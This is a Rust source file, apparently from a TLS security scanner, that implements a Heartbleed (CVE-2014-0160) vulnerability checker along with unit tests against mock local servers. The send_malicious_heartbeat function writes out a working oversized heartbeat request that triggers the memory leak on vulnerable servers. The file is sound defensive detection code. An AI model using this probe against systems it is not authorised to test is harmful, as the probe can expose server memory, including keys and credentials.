// Heartbleed (CVE-2014-0160) vulnerability checker

use crate::constants::{
    BUFFER_SIZE_MAX_WITH_OVERHEAD, CONTENT_TYPE_HEARTBEAT, HEARTBEAT_REQUEST,
    TLS_HANDSHAKE_TIMEOUT, TLS_RECORD_HEADER_SIZE, VERSION_TLS_1_2,
};
use crate::protocols::{Protocol, handshake::ClientHelloBuilder};
use crate::utils::network::Target;
use crate::{Result, TlsError};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

mod heartbeat_response;
mod server_hello;

fn read_u16_at(data: &[u8], offset: usize) -> Option<u16> {
    data.get(offset..offset.checked_add(2)?)?
        .try_into()
        .ok()
        .map(u16::from_be_bytes)
}

#[cfg(test)]
fn write_u16_at(data: &mut [u8], offset: usize, value: u16) {
    data.get_mut(offset..offset + 2)
        .expect("test fixture should contain u16 placeholder")
        .copy_from_slice(&value.to_be_bytes());
}

#[cfg(test)]
fn write_u24_at(data: &mut [u8], offset: usize, value: usize) {
    data.get_mut(offset..offset + 3)
        .expect("test fixture should contain u24 placeholder")
        .copy_from_slice(&[
            ((value >> 16) & 0xff) as u8,
            ((value >> 8) & 0xff) as u8,
            (value & 0xff) as u8,
        ]);
}

/// Heartbleed detection result with detailed information
#[derive(Debug, Clone)]
pub struct HeartbleedResult {
    pub vulnerable: bool,
    pub bytes_received: usize,
    pub bytes_sent: usize,
    pub details: String,
    /// Whether the test was actually performed (false if connection/parsing failed)
    pub tested: bool,
}

/// Heartbleed vulnerability tester
pub struct HeartbleedTester<'a> {
    target: &'a Target,
    sni_hostname: Option<String>,
    connect_timeout: Duration,
    read_timeout: Duration,
    starttls: Option<crate::starttls::StarttlsProtocol>,
    starttls_server_mode: bool,
    starttls_hostname: Option<String>,
    test_all_ips: bool,
}

impl<'a> HeartbleedTester<'a> {
    /// Create new Heartbleed tester
    pub fn new(target: &'a Target) -> Self {
        Self {
            target,
            sni_hostname: None,
            connect_timeout: Duration::from_secs(10),
            read_timeout: TLS_HANDSHAKE_TIMEOUT,
            starttls: None,
            starttls_server_mode: false,
            starttls_hostname: None,
            test_all_ips: false,
        }
    }

    pub fn with_sni(mut self, sni: Option<String>) -> Self {
        self.sni_hostname = sni;
        self
    }

    /// Configure STARTTLS negotiation before the heartbeat probe.
    pub fn with_starttls(
        mut self,
        protocol: Option<crate::starttls::StarttlsProtocol>,
        hostname: Option<String>,
        server_mode: bool,
    ) -> Self {
        self.starttls = protocol;
        self.starttls_hostname = hostname;
        self.starttls_server_mode = server_mode;
        self
    }

    pub fn with_test_all_ips(mut self, test_all_ips: bool) -> Self {
        self.test_all_ips = test_all_ips;
        self
    }

    /// Hostname used for STARTTLS negotiation (EHLO/`to`/…).
    fn starttls_negotiation_hostname(&self) -> String {
        self.starttls_hostname
            .clone()
            .unwrap_or_else(|| self.target.hostname.clone())
    }

    /// Test for Heartbleed vulnerability
    /// CVE-2014-0160: TLS Heartbeat Extension memory disclosure
    pub async fn test(&self) -> Result<HeartbleedResult> {
        let mut any_tested = false;
        for protocol in [Protocol::TLS10, Protocol::TLS11, Protocol::TLS12] {
            let result = self.test_protocol(protocol).await?;
            if result.tested {
                any_tested = true;
            }
            if result.vulnerable {
                return Ok(result);
            }
        }

        Ok(HeartbleedResult {
            vulnerable: false,
            bytes_received: 0,
            bytes_sent: 3,
            details: if any_tested {
                "Not vulnerable - No memory leak detected across TLS 1.0/1.1/1.2".to_string()
            } else {
                "Unable to test - No TLS protocol connection succeeded (inconclusive)".to_string()
            },
            tested: any_tested,
        })
    }

    /// Test specific protocol for Heartbleed
    async fn test_protocol(&self, protocol: Protocol) -> Result<HeartbleedResult> {
        let addrs: Vec<_> = if self.test_all_ips {
            self.target.socket_addrs()
        } else {
            self.target
                .socket_addrs()
                .first()
                .copied()
                .into_iter()
                .collect()
        };
        if addrs.is_empty() {
            return Err(crate::TlsError::NoSocketAddresses);
        }

        let mut any_tested = false;
        let mut last_result = None;
        for addr in addrs {
            let result = self.test_protocol_addr(protocol, addr).await?;
            if result.tested {
                any_tested = true;
            }
            if result.vulnerable {
                return Ok(result);
            }
            last_result = Some(result);
        }

        let mut result = last_result.ok_or(crate::TlsError::NoSocketAddresses)?;
        result.tested = any_tested;
        Ok(result)
    }

    async fn test_protocol_addr(
        &self,
        protocol: Protocol,
        addr: std::net::SocketAddr,
    ) -> Result<HeartbleedResult> {
        // Connect TCP (upgrading via STARTTLS first for plaintext-first services)
        let mut stream = match crate::utils::network::connect_with_starttls(
            addr,
            self.connect_timeout,
            self.starttls,
            &self.starttls_negotiation_hostname(),
            self.starttls_server_mode,
        )
        .await
        {
            Ok(s) => s,
            Err(_) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: "Connection failed - Vulnerability status UNKNOWN (unable to test)"
                        .to_string(),
                    tested: false,
                });
            }
        };

        // Build ClientHello with Heartbeat extension
        let mut builder = ClientHelloBuilder::new(protocol);
        builder.add_ciphers(&[0xc014, 0xc00a, 0x0039, 0x0038, 0x0035]);

        // Add heartbeat extension (type 0x000f)
        let heartbeat_ext = vec![0x01]; // peer_allowed_to_send
        builder.add_extension(crate::protocols::Extension::new(0x000f, heartbeat_ext));

        let sni_hostname = crate::utils::network::sni_hostname_for_target(
            &self.target.hostname,
            self.sni_hostname.as_deref(),
        );
        let client_hello = builder.build_with_defaults(sni_hostname.as_deref())?;

        // Send ClientHello
        let response = match timeout(self.read_timeout, async {
            stream.write_all(&client_hello).await?;
            self.read_complete_tls_record(&mut stream, BUFFER_SIZE_MAX_WITH_OVERHEAD)
                .await
        })
        .await
        {
            Ok(Ok(resp)) if !resp.is_empty() => resp,
            _ => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: "ServerHello timeout or empty response".to_string(),
                    tested: false,
                });
            }
        };

        if response.first() != Some(&0x16) || response.get(5) != Some(&0x02) {
            return Ok(HeartbleedResult {
                vulnerable: false,
                bytes_received: response.len(),
                bytes_sent: 0,
                details:
                    "Unable to test - unexpected TLS response while probing heartbeat extension"
                        .to_string(),
                tested: false,
            });
        }

        // Check if server accepted heartbeat extension
        match server_hello::has_heartbeat_extension(&response) {
            Ok(true) => {}
            Ok(false) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: "Heartbeat extension not supported by server".to_string(),
                    tested: true,
                });
            }
            Err(error) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: format!("Unable to test - malformed ServerHello: {}", error),
                    tested: false,
                });
            }
        }

        // Send malicious heartbeat request
        self.send_malicious_heartbeat(&mut stream).await
    }

    /// Send malicious heartbeat request and check for memory leak
    async fn send_malicious_heartbeat(&self, stream: &mut TcpStream) -> Result<HeartbleedResult> {
        const HEARTBEAT_CLAIMED_PAYLOAD_LEN: usize = 16387; // claimed in TLS record header (3 + 16384)
        const HEARTBEAT_BYTES_SENT: usize = 8; // actual bytes sent (5 TLS header + 1 type + 2 length)
        // Minimum suspicious response threshold.
        // A legitimate heartbeat response echoes our 3 bytes payload plus 3 bytes header (type + length).
        // TLS record overhead: 5 bytes (content type + version + length).
        // Total legitimate: ~11 bytes minimum.
        //
        // CRITICAL: We must distinguish between legitimate heartbeat responses and memory leaks.
        // A legitimate Heartbeat Response (type 0x02) would echo our 3 bytes payload + 3 bytes header
        // = 6 bytes, plus 5 bytes TLS record = 11 bytes total.
        //
        // A vulnerable server returns the claimed length (16384 bytes) which is far larger.
        // We use 16 bytes as threshold to avoid false positives from minimal echo responses
        // while still catching small leaks (some vulnerable implementations leak ~32-64 bytes).
        //
        // Response structure validation:
        // - Content type must be Heartbeat (0x18)
        // - Heartbeat message type must be Response (0x02), not Request (0x01)
        // - Payload length field claims more bytes than we sent
        //
        // See: CVE-2014-0160 - heartbeat allows reading up to 64KB of memory.
        const MIN_SUSPICIOUS_RESPONSE: usize = 16;
        // Responses below this threshold warrant manual verification warning
        const WARNING_THRESHOLD: usize = 32;

        // Build malicious heartbeat request.
        // The TLS record length must encompass the full heartbeat message:
        // type(1) + length(2) + claimed_payload(0x4000) = 3 + 16384 = 16387 bytes.
        // A vulnerable server reads past the 3-byte heartbeat header into process memory.
        let claimed_payload_length: u16 = 0x4000; // 16384 bytes — the malicious claim
        let heartbeat_msg_len = 3 + claimed_payload_length as usize; // type(1) + length(2) + payload
        let heartbeat_msg_len =
            u16::try_from(heartbeat_msg_len).map_err(|_| TlsError::ParseError {
                message: "Heartbleed heartbeat message length too large".to_string(),
            })?;
        let version = VERSION_TLS_1_2.to_be_bytes();
        let heartbeat_msg_len = heartbeat_msg_len.to_be_bytes();
        let heartbeat = vec![
            CONTENT_TYPE_HEARTBEAT,                // Content Type: Heartbeat (0x18)
            version[0],                            // Version: TLS 1.2 (0x0303)
            version[1],                            // Version low byte
            heartbeat_msg_len[0],                  // Record length high byte
            heartbeat_msg_len[1],                  // Record length low byte
            HEARTBEAT_REQUEST,                     // Heartbeat request type (0x01)
            (claimed_payload_length >> 8) as u8,   // Payload length high byte
            (claimed_payload_length & 0xff) as u8, // Payload length low byte
        ];

        stream.write_all(&heartbeat).await?;
        let result = match self
            .read_complete_tls_record(stream, u16::MAX as usize + TLS_RECORD_HEADER_SIZE)
            .await
        {
            Ok(response) => response,
            Err(error) if error.kind() == std::io::ErrorKind::TimedOut => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: HEARTBEAT_BYTES_SENT,
                    details:
                        "Timeout waiting for heartbeat response - server may have closed connection"
                            .to_string(),
                    tested: false,
                });
            }
            Err(_) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: HEARTBEAT_BYTES_SENT,
                    details:
                        "Connection error during heartbeat test - server may have closed connection"
                            .to_string(),
                    tested: false,
                });
            }
        };

        let n = result.len();

        // Validate response structure
        let is_valid_heartbeat_response = heartbeat_response::is_valid(&result);

        // If response doesn't look like a valid heartbeat response, it's suspicious
        // (server might be returning an error or TLS alert)
        let vulnerable = n >= MIN_SUSPICIOUS_RESPONSE && is_valid_heartbeat_response;
        let details = if vulnerable {
            if n < WARNING_THRESHOLD {
                format!(
                    "VULNERABLE: Heartbleed detected. Received {} bytes (sent {} bytes, claimed {} bytes in heartbeat). \
                     NOTE: Response size is small, manual verification recommended.",
                    n, HEARTBEAT_BYTES_SENT, HEARTBEAT_CLAIMED_PAYLOAD_LEN
                )
            } else {
                format!(
                    "VULNERABLE: Heartbleed detected. Received {} bytes (sent {} bytes, claimed {} bytes). Memory leak confirmed.",
                    n, HEARTBEAT_BYTES_SENT, HEARTBEAT_CLAIMED_PAYLOAD_LEN
                )
            }
        } else if n == 0 {
            "Connection closed by server during heartbeat test - inconclusive. \
             Server may have rejected malformed heartbeat (not vulnerable) or \
             may have crashed (potentially vulnerable). Manual verification recommended."
                .to_string()
        } else if !is_valid_heartbeat_response && n > 0 {
            format!(
                "Not vulnerable - Response does not appear to be a valid heartbeat response. \
                 Received {} bytes. Manual verification recommended if server returned unexpected data.",
                n
            )
        } else {
            format!(
                "Not vulnerable - Received {} bytes (sent {} bytes, claimed {} bytes, threshold: {})",
                n, HEARTBEAT_BYTES_SENT, HEARTBEAT_CLAIMED_PAYLOAD_LEN, MIN_SUSPICIOUS_RESPONSE
            )
        };

        Ok(HeartbleedResult {
            vulnerable,
            bytes_received: n,
            bytes_sent: HEARTBEAT_BYTES_SENT,
            details,
            // n=0: server sent nothing after the malicious heartbeat → inconclusive
            // n 1..MIN_SUSPICIOUS_RESPONSE: ambiguous partial response → inconclusive
            // n>=MIN_SUSPICIOUS_RESPONSE: enough data to classify
            tested: n >= MIN_SUSPICIOUS_RESPONSE,
        })
    }

    async fn read_complete_tls_record(
        &self,
        stream: &mut TcpStream,
        max_len: usize,
    ) -> std::io::Result<Vec<u8>> {
        let mut response = vec![0u8; max_len];
        let mut total = 0usize;
        loop {
            if total >= response.len() {
                break;
            }
            let read_buf = response.get_mut(total..).ok_or_else(|| {
                std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    "heartbeat response read offset exceeded buffer",
                )
            })?;
            let n = match timeout(self.read_timeout, stream.read(read_buf)).await {
                Ok(read) => read?,
                Err(_) => {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::TimedOut,
                        "heartbeat response read timed out",
                    ));
                }
            };
            if n == 0 {
                break;
            }
            total += n;
            if total >= TLS_RECORD_HEADER_SIZE {
                let record_len = u16::from_be_bytes([response[3], response[4]]) as usize;
                let record_total =
                    TLS_RECORD_HEADER_SIZE
                        .checked_add(record_len)
                        .ok_or_else(|| {
                            std::io::Error::new(
                                std::io::ErrorKind::InvalidData,
                                "heartbeat response record length overflow",
                            )
                        })?;
                if record_total > response.len() {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::InvalidData,
                        "heartbeat response record length exceeds buffer",
                    ));
                }
                if total >= record_total {
                    break;
                }
            }
        }
        response.truncate(total);
        Ok(response)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::constants::BUFFER_SIZE_MAX_TLS_RECORD;
    use std::net::{IpAddr, Ipv4Addr};
    use tokio::net::TcpListener;

    async fn spawn_heartbeat_server(response_size: usize) -> u16 {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        tokio::spawn(async move {
            if let Ok((mut socket, _)) = listener.accept().await {
                let mut buffer = [0u8; 4096];
                let _ = socket.read(&mut buffer).await;

                // Build a valid TLS Heartbeat Response structure
                // Content type: Heartbeat (0x18)
                // Version: TLS 1.2 (0x0303)
                // Length: response_size
                // Heartbeat type: Response (0x02)
                // Payload length: response_size - 3 (after type and length bytes)
                // Payload: zeros

                let mut response = Vec::new();
                response.push(0x18); // Content type: Heartbeat
                response.push(0x03); // Version TLS 1.2
                response.push(0x03);

                // Record length (2 bytes, big-endian)
                // For heartbeat response: type(1) + length(2) + payload
                let payload_len = response_size.saturating_sub(3);
                let record_len = 3 + payload_len;
                response.push((record_len >> 8) as u8);
                response.push((record_len & 0xff) as u8);

                // Heartbeat response type (0x02)
                response.push(0x02);

                // Payload length (2 bytes, big-endian)
                response.push((payload_len >> 8) as u8);
                response.push((payload_len & 0xff) as u8);

                // Payload (zeros)
                response.extend(vec![0u8; payload_len]);

                let _ = socket.write_all(&response).await;
            }
        });

        port
    }

    async fn spawn_split_heartbeat_server(response_size: usize, first_chunk_len: usize) -> u16 {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        tokio::spawn(async move {
            if let Ok((mut socket, _)) = listener.accept().await {
                let mut buffer = [0u8; 4096];
                let _ = socket.read(&mut buffer).await;

                let payload_len = response_size.saturating_sub(3);
                let record_len = 3 + payload_len;
                let mut response = vec![
                    0x18,
                    0x03,
                    0x03,
                    (record_len >> 8) as u8,
                    (record_len & 0xff) as u8,
                    0x02,
                    (payload_len >> 8) as u8,
                    (payload_len & 0xff) as u8,
                ];
                response.extend(vec![0u8; payload_len]);

                let split = first_chunk_len.min(response.len());
                let _ = socket.write_all(&response[..split]).await;
                tokio::time::sleep(Duration::from_millis(50)).await;
                let _ = socket.write_all(&response[split..]).await;
            }
        });

        port
    }

    async fn spawn_heartbeat_alert_server() -> u16 {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        tokio::spawn(async move {
            if let Ok((mut socket, _)) = listener.accept().await {
                let mut buffer = [0u8; 4096];
                let _ = socket.read(&mut buffer).await;
                let alert = [0x15, 0x03, 0x03, 0x00, 0x02, 0x02, 0x28];
                let _ = socket.write_all(&alert).await;
            }
        });

        port
    }

    async fn spawn_heartbleed_probe_server(response_size: usize) -> u16 {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        tokio::spawn(async move {
            if let Ok((mut socket, _)) = listener.accept().await {
                let mut buffer = [0u8; 4096];
                let _ = socket.read(&mut buffer).await;
                let _ = socket.write_all(&server_hello_with_heartbeat()).await;
                let _ = socket.read(&mut buffer).await;

                let payload_len = response_size.saturating_sub(3);
                let record_len = 3 + payload_len;
                let mut response = vec![
                    0x18,
                    0x03,
                    0x03,
                    (record_len >> 8) as u8,
                    (record_len & 0xff) as u8,
                    0x02,
                    (payload_len >> 8) as u8,
                    (payload_len & 0xff) as u8,
                ];
                response.extend(vec![0u8; payload_len]);
                let _ = socket.write_all(&response).await;
            }
        });

        port
    }

    fn server_hello_with_heartbeat() -> Vec<u8> {
        let mut data = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, // TLS record header
            0x02, 0x00, 0x00, 0x00, // ServerHello header
            0x03, 0x03, // ServerHello version
        ];
        data.extend_from_slice(&[0xAA; 32]);
        data.push(0x00);
        data.extend_from_slice(&[0x13, 0x01]);
        data.push(0x00);
        data.extend_from_slice(&[0x00, 0x05]);
        data.extend_from_slice(&[0x00, 0x0f, 0x00, 0x01, 0x01]);
        let record_len = (data.len() - 5) as u16;
        write_u16_at(&mut data, 3, record_len);
        let hs_len = data.len() - 9;
        write_u24_at(&mut data, 6, hs_len);
        data
    }

    fn max_size_server_hello_with_heartbeat() -> Vec<u8> {
        let mut data = server_hello_with_heartbeat();
        let current_record_len = data.len() - TLS_RECORD_HEADER_SIZE;
        let filler_len = BUFFER_SIZE_MAX_TLS_RECORD - current_record_len - 4;
        data.push(0x0b);
        data.extend_from_slice(&[
            ((filler_len >> 16) & 0xff) as u8,
            ((filler_len >> 8) & 0xff) as u8,
            (filler_len & 0xff) as u8,
        ]);
        data.extend_from_slice(&vec![0u8; filler_len]);
        write_u16_at(&mut data, 3, BUFFER_SIZE_MAX_TLS_RECORD as u16);
        data
    }

    #[tokio::test]
    #[ignore] // Requires network access
    async fn test_heartbleed_modern_server() {
        let target = Target::parse("www.google.com:443")
            .await
            .expect("test assertion should succeed");
        let tester = HeartbleedTester::new(&target);

        let result = tester.test().await.expect("test assertion should succeed");

        // Google should not be vulnerable
        assert!(!result.vulnerable);
    }

    #[tokio::test]
    async fn test_heartbleed_unexpected_response_is_inconclusive() {
        let port = spawn_heartbeat_alert_server().await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);

        let result = tester
            .test_protocol(Protocol::TLS12)
            .await
            .expect("test assertion should succeed");

        assert!(!result.vulnerable);
        assert!(!result.tested);
        assert!(
            result
                .details
                .contains("unexpected TLS response while probing heartbeat extension")
        );
    }

    #[tokio::test]
    async fn test_heartbleed_reads_split_initial_serverhello() {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buffer = [0u8; 4096];
            let _ = socket.read(&mut buffer).await;
            let response = server_hello_with_heartbeat();
            let split = 12;
            let _ = socket.write_all(&response[..split]).await;
            tokio::time::sleep(Duration::from_millis(50)).await;
            let _ = socket.write_all(&response[split..]).await;
            let _ = timeout(Duration::from_millis(500), socket.read(&mut buffer)).await;
        });

        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_millis(200),
            read_timeout: Duration::from_millis(200),
            starttls: None,
            starttls_server_mode: false,
            starttls_hostname: None,
            test_all_ips: false,
        };
        let result = tester.test_protocol(Protocol::TLS12).await.unwrap();

        assert!(result.bytes_sent > 0, "{result:?}");
        assert!(!result.vulnerable);

        server.await.unwrap();
    }

    #[tokio::test]
    async fn test_heartbleed_accepts_max_size_initial_serverhello() {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buffer = [0u8; 4096];
            let _ = socket.read(&mut buffer).await;
            let response = max_size_server_hello_with_heartbeat();
            let _ = socket.write_all(&response).await;
            let _ = timeout(Duration::from_millis(500), socket.read(&mut buffer)).await;
        });

        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_millis(200),
            read_timeout: Duration::from_millis(200),
            starttls: None,
            starttls_server_mode: false,
            starttls_hostname: None,
            test_all_ips: false,
        };
        let result = tester.test_protocol(Protocol::TLS12).await.unwrap();

        assert!(result.bytes_sent > 0, "{result:?}");
        assert!(!result.vulnerable);

        server.await.unwrap();
    }

    #[tokio::test]
    async fn test_heartbleed_all_ips_uses_any_vulnerable_ip() {
        let port = spawn_heartbleed_probe_server(256).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![
                IpAddr::V4(Ipv4Addr::new(127, 0, 0, 2)),
                IpAddr::V4(Ipv4Addr::LOCALHOST),
            ],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_millis(200),
            read_timeout: Duration::from_millis(200),
            starttls: None,
            starttls_server_mode: false,
            starttls_hostname: None,
            test_all_ips: true,
        };

        let result = tester.test().await.unwrap();

        assert!(result.vulnerable, "{result:?}");
    }

    #[test]
    fn test_heartbeat_extension_check() {
        // Build a minimal valid ServerHello with heartbeat extension (0x000f)
        // Record: type=0x16, version=0x0303, length=TBD
        // Handshake: type=0x02, length=TBD
        // ServerHello: version=0x0303, random(32), sid_len=0, cipher=0x1301, compress=0x00
        // Extensions: len=TBD, ext_type=0x000f, ext_len=1, ext_data=0x01
        let mut data_with_ext = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, // TLS record header (length placeholder)
            0x02, 0x00, 0x00, 0x00, // Handshake header (length placeholder)
            0x03, 0x03, // ServerHello version TLS 1.2
        ];
        data_with_ext.extend_from_slice(&[0xAA; 32]); // 32 bytes random
        data_with_ext.push(0x00); // session_id_length = 0
        data_with_ext.extend_from_slice(&[0x13, 0x01]); // cipher suite
        data_with_ext.push(0x00); // compression method
        // Extensions: total length=5, heartbeat ext (type=0x000f, len=1, data=0x01)
        data_with_ext.extend_from_slice(&[0x00, 0x05]); // extensions total length
        data_with_ext.extend_from_slice(&[0x00, 0x0f]); // ext type: heartbeat
        data_with_ext.extend_from_slice(&[0x00, 0x01]); // ext length
        data_with_ext.push(0x01); // heartbeat mode: peer_allowed_to_send
        // Patch record and handshake lengths
        let record_len = (data_with_ext.len() - 5) as u16;
        write_u16_at(&mut data_with_ext, 3, record_len);
        let hs_len = data_with_ext.len() - 9;
        write_u24_at(&mut data_with_ext, 6, hs_len);

        assert!(server_hello::has_heartbeat_extension(&data_with_ext).unwrap());

        // Same ServerHello but WITHOUT the heartbeat extension (no extensions)
        let mut data_without_ext = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x03,
        ];
        data_without_ext.extend_from_slice(&[0xAA; 32]);
        data_without_ext.push(0x00);
        data_without_ext.extend_from_slice(&[0x13, 0x01]);
        data_without_ext.push(0x00);
        let record_len = (data_without_ext.len() - 5) as u16;
        write_u16_at(&mut data_without_ext, 3, record_len);
        let hs_len = data_without_ext.len() - 9;
        write_u24_at(&mut data_without_ext, 6, hs_len);
        assert!(!server_hello::has_heartbeat_extension(&data_without_ext).unwrap());

        // Extra bytes after the declared TLS record must not be parsed as
        // ServerHello extensions.
        let mut data_with_trailing_ext = data_without_ext;
        data_with_trailing_ext.extend_from_slice(&[
            0x00, 0x05, // extensions total length
            0x00, 0x0f, // heartbeat extension type
            0x00, 0x01, // extension length
            0x01, // heartbeat mode
        ]);
        assert!(!server_hello::has_heartbeat_extension(&data_with_trailing_ext).unwrap());
    }

    #[test]
    fn test_heartbeat_extension_in_combined_handshake_record() {
        let mut data = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, // TLS record header (length placeholder)
            0x02, 0x00, 0x00, 0x00, // ServerHello header (length placeholder)
            0x03, 0x03, // ServerHello version TLS 1.2
        ];
        data.extend_from_slice(&[0xAA; 32]);
        data.push(0x00);
        data.extend_from_slice(&[0x13, 0x01]);
        data.push(0x00);
        data.extend_from_slice(&[
            0x00, 0x05, // extensions total length
            0x00, 0x0f, // heartbeat extension type
            0x00, 0x01, // extension length
            0x01, // heartbeat mode
        ]);
        let hs_len = data.len() - 9;
        write_u24_at(&mut data, 6, hs_len);

        data.extend_from_slice(&[
            0x0b, 0x00, 0x00, 0x00, // next handshake message in the same record
        ]);
        let record_len = (data.len() - 5) as u16;
        write_u16_at(&mut data, 3, record_len);

        assert!(server_hello::has_heartbeat_extension(&data).unwrap());
    }

    #[test]
    fn test_heartbeat_extension_short_data_false() {
        assert!(!server_hello::has_heartbeat_extension(&[0x00]).unwrap());
    }

    #[test]
    fn test_heartbeat_extension_rejects_truncated_serverhello() {
        let err = server_hello::has_heartbeat_extension(&[0x16, 0x03, 0x03, 0x00, 0x01, 0x02])
            .expect_err("truncated ServerHello should fail");
        assert!(err.to_string().contains("session_id_len"));
    }

    #[test]
    fn test_heartbeat_extension_rejects_oversized_session_id() {
        let mut data = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x03,
        ];
        data.extend_from_slice(&[0u8; 32]);
        data.push(33);
        let record_len = (data.len() - 5) as u16;
        write_u16_at(&mut data, 3, record_len);
        let hs_len = data.len() - 9;
        write_u24_at(&mut data, 6, hs_len);

        let err = server_hello::has_heartbeat_extension(&data)
            .expect_err("oversized session id should fail");
        assert!(err.to_string().contains("session_id_length"));
    }

    #[test]
    fn test_heartbeat_extension_exact_two_bytes() {
        // Two bytes alone is insufficient - need at least 3 bytes for the search loop
        // (saturating_sub(2) means we need at least 3 to have one iteration)
        // This test validates that minimum length is enforced
        assert!(!server_hello::has_heartbeat_extension(&[0x00, 0x0f]).unwrap());
    }

    #[test]
    fn test_validate_heartbeat_response_rejects_mismatched_lengths() {
        let response = [0x18, 0x03, 0x03, 0x00, 0x04, 0x02, 0x00, 0x01];
        assert!(!heartbeat_response::is_valid(&response));
    }

    #[test]
    fn test_check_heartbeat_extension_rejects_truncated_extension_block() {
        let mut data = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x03,
        ];
        data.extend_from_slice(&[0u8; 32]);
        data.push(0x00);
        data.extend_from_slice(&[0x13, 0x01]);
        data.push(0x00);
        data.extend_from_slice(&[0x00, 0x06, 0x00, 0x0f, 0x00, 0x01]);

        let rec_len = (data.len() - 5) as u16;
        write_u16_at(&mut data, 3, rec_len);
        let hs_len = data.len() - 9;
        write_u24_at(&mut data, 6, hs_len);

        let err = server_hello::has_heartbeat_extension(&data)
            .expect_err("truncated extension block should fail");
        assert!(
            err.to_string()
                .contains("extension block extends beyond declared length")
        );
    }

    #[tokio::test]
    async fn test_send_malicious_heartbeat_detects_leak() {
        let port = spawn_heartbeat_server(256).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);
        let addr = target
            .socket_addrs()
            .first()
            .copied()
            .expect("test target should have socket address");
        let mut stream = TcpStream::connect(addr).await.unwrap();
        let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
        assert!(result.vulnerable);
        assert!(result.bytes_received > 16); // Above the threshold for vulnerability detection
    }

    #[tokio::test]
    async fn test_send_malicious_heartbeat_reads_split_record() {
        let port = spawn_split_heartbeat_server(256, 12).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);
        let addr = target
            .socket_addrs()
            .first()
            .copied()
            .expect("test target should have socket address");
        let mut stream = TcpStream::connect(addr).await.unwrap();

        let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();

        assert!(result.vulnerable, "{result:?}");
        assert_eq!(result.bytes_received, 5 + 256);
    }

    #[tokio::test]
    async fn test_send_malicious_heartbeat_no_leak() {
        // Use a response size below the threshold to simulate a non-vulnerable server
        // A legitimate heartbeat echo would be ~11 bytes (3 payload + 3 header + 5 TLS record)
        // but we use 0 bytes to simulate a server that closes the connection immediately
        // or returns an error without leaking memory
        let port = spawn_heartbeat_server(0).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);
        let addr = target
            .socket_addrs()
            .first()
            .copied()
            .expect("test target should have socket address");
        let mut stream = TcpStream::connect(addr).await.unwrap();
        let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
        assert!(!result.vulnerable);
        assert!(!result.tested);
    }
}
